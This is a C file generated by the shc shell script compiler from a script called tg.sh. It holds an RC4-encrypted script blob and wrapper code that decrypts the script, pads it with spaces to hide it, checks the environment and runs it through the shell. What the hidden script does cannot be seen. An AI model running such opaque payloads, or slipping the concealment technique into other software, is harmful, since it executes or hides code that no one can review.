#if 0
	shc Version 3.9.6, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f tg.sh -o tg 
#endif

static  char data [] = 
#define      opts_z	1
#define      opts	((&data[0]))
	"\237"
#define      shll_z	10
#define      shll	((&data[2]))
	"\311\003\013\207\220\220\330\025\016\326\107"
#define      date_z	1
#define      date	((&data[12]))
	"\035"
#define      msg1_z	65
#define      msg1	((&data[15]))
	"\320\076\210\146\372\247\017\161\003\357\312\027\361\176\175\247"
	"\350\201\065\357\272\377\355\273\026\121\175\245\127\007\200\302"
	"\342\147\230\316\175\335\106\155\315\377\246\236\347\204\001\214"
	"\164\023\333\033\055\126\020\360\221\121\346\033\015\154\121\170"
	"\310\032\044\270\376\015\230\310\105\011"
#define      chk1_z	22
#define      chk1	((&data[88]))
	"\213\137\257\315\347\317\337\344\152\163\032\165\077\004\041\334"
	"\165\365\141\241\215\223\022\241"
#define      text_z	586
#define      text	((&data[217]))
	"\145\201\053\072\274\263\103\205\333\321\277\354\370\055\274\067"
	"\346\273\104\176\204\212\210\032\306\266\246\150\177\137\266\344"
	"\340\341\037\234\224\142\042\160\064\342\134\054\017\031\143\365"
	"\324\250\164\131\062\375\163\370\263\031\140\063\170\027\027\131"
	"\370\067\366\215\232\030\376\316\372\133\372\012\164\136\000\111"
	"\006\165\242\071\162\025\061\046\056\222\131\247\251\161\000\242"
	"\250\366\060\102\017\056\020\012\211\013\356\053\315\232\077\062"
	"\257\227\046\371\304\146\061\317\175\117\055\345\373\004\003\347"
	"\353\123\021\012\344\070\255\067\165\263\231\311\301\304\171\266"
	"\220\124\223\153\227\314\347\032\042\041\332\266\372\044\072\351"
	"\353\323\172\047\105\344\125\214\201\361\277\225\122\362\177\374"
	"\304\234\137\230\331\330\041\152\141\253\307\247\173\302\257\351"
	"\255\221\303\225\361\204\312\326\270\101\031\166\214\240\345\257"
	"\364\110\211\132\141\315\304\055\122\140\157\147\103\242\211\032"
	"\113\107\223\072\373\141\124\102\033\372\141\272\112\141\306\060"
	"\252\141\015\130\234\372\031\345\064\162\242\047\236\060\211\364"
	"\066\075\252\350\230\245\122\141\043\203\107\105\003\055\001\075"
	"\306\225\302\366\066\375\213\026\074\342\013\072\204\147\112\120"
	"\336\306\114\056\160\327\167\324\373\111\023\325\243\304\056\325"
	"\154\374\375\126\050\010\247\223\351\234\203\267\261\166\134\014"
	"\365\236\356\006\347\367\131\132\101\207\200\112\330\364\250\025"
	"\133\213\366\124\103\257\354\004\027\053\070\200\347\364\223\236"
	"\035\003\200\206\233\273\040\267\127\160\336\306\373\247\020\012"
	"\146\311\013\175\334\136\122\252\075\065\315\050\161\235\211\263"
	"\002\314\236\336\037\032\057\262\266\074\374\264\226\363\217\227"
	"\266\054\136\345\302\262\354\356\154\114\154\110\145\230\010\262"
	"\232\132\110\057\130\227\245\021\273\372\246\203\335\363\052\077"
	"\066\344\305\067\121\365\277\211\314\066\207\046\212\115\247\206"
	"\246\023\151\335\377\143\020\077\170\033\051\375\376\006\000\135"
	"\154\365\324\053\136\174\174\130\220\232\247\324\041\110\053\164"
	"\210\020\054\047\167\234\114\072\340\021\075\336\332\107\377\276"
	"\221\234\115\205\073\236\352\134\331\337\035\115\170\234\035\170"
	"\100\060\054\244\005\256\270\234\255\226\120\161\066\006\176\054"
	"\033\342\335\351\254\153\011\327\047\210\230\375\311\333\261\173"
	"\226\275\177\344\073\017\075\311\334\004\074\006\235\305\225\036"
	"\271\006\047\126\271\144\037\160\124\205\061\011\035\303\061\307"
	"\127\075\132\174\040\151\066\002\333\205\116\073\171\212\316\053"
	"\025\200\175\167\043\144\377\175\264\225\174\220\177\236\351\073"
	"\027\033\253\352\350\001\053\240\322\325\346\057\260\104\357\332"
	"\267\305\023\023\325\002\044\133\230\303\364\255\002\154\001\021"
	"\375\100\275\371\044\250\074\106\303\337\105\021\132\001\272\353"
	"\225\377\242\011\077\065\230\140\366\106\310\351\200\272\342\057"
	"\370\264\066\302\163\143\155\354\031\062\310\347\332\363\143\120"
	"\063\332\336\076\025\376\152\025\107\160\212\351\252\375\377\333"
	"\043\055\156\174\325\027\355\325\272\226\314\352\331\334\031\352"
	"\346\242\366\373\240\140\021\350\321\234\322\173\231\321\126\275"
	"\377"
#define      tst2_z	19
#define      tst2	((&data[849]))
	"\334\034\273\342\366\226\025\044\277\112\353\150\203\226\314\044"
	"\373\113\105\334\050\252\226\276"
#define      lsto_z	1
#define      lsto	((&data[872]))
	"\201"
#define      inlo_z	3
#define      inlo	((&data[873]))
	"\161\165\331"
#define      xecc_z	15
#define      xecc	((&data[876]))
	"\200\236\165\316\360\003\040\200\361\307\036\012\004\342\061\066"
#define      chk2_z	19
#define      chk2	((&data[896]))
	"\306\252\344\230\062\332\374\242\065\064\155\321\237\163\234\002"
	"\217\040\264\165\073\277\053\045"
#define      tst1_z	22
#define      tst1	((&data[918]))
	"\073\151\210\115\105\232\266\011\250\252\250\375\025\275\233\217"
	"\306\035\356\273\260\014\137\322\101\165"
#define      msg2_z	19
#define      msg2	((&data[942]))
	"\103\264\333\237\061\171\245\035\221\030\206\270\317\152\221\001"
	"\176\377\017\350\264\134"
#define      rlax_z	1
#define      rlax	((&data[964]))
	"\115"
#define      pswd_z	256
#define      pswd	((&data[1018]))
	"\354\016\361\042\354\312\152\262\164\116\113\231\314\265\025\010"
	"\037\127\176\135\164\034\105\051\171\244\137\156\127\060\346\103"
	"\076\330\146\053\242\321\335\027\040\051\260\355\337\306\365\376"
	"\035\164\134\222\220\355\375\036\352\002\303\114\315\302\024\353"
	"\003\337\310\251\376\000\242\114\265\235\062\135\065\043\061\240"
	"\067\115\235\056\072\232\114\045\235\020\162\153\322\206\126\326"
	"\146\037\177\144\040\041\261\326\277\344\063\365\010\144\225\077"
	"\262\063\155\355\316\272\023\153\312\205\326\234\014\055\163\162"
	"\114\362\326\155\024\210\103\324\154\166\311\164\333\137\263\215"
	"\222\041\173\141\333\216\314\245\023\243\102\040\321\265\222\036"
	"\250\151\213\274\362\316\220\136\104\132\323\040\272\206\256\115"
	"\250\051\256\203\267\173\051\313\036\154\353\357\042\176\015\312"
	"\350\231\207\332\147\030\070\253\162\014\313\054\222\172\172\073"
	"\243\050\276\133\243\350\046\302\124\022\262\166\221\300\101\171"
	"\131\310\124\300\340\215\154\123\231\070\200\054\262\372\147\125"
	"\042\046\260\305\016\327\207\142\351\071\331\173\371\032\364\122"
	"\342\110\022\303\326\176\026\157\267\226\233\151\220\002\276\262"
	"\051\157\170\067\106\377\232\060\071\163\253\063\216\240\205\160"
	"\350\230\063\277\027\112\056\316\340\312\067\160\315\366\043\366"
	"\145\233\055\254\233\241\274\011\106\034\170\235\114\137\341\213"
	"\067\110\266\332\031\224\361\071\276\242\046\235\151\034\234\207"
	"\220\371\032"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
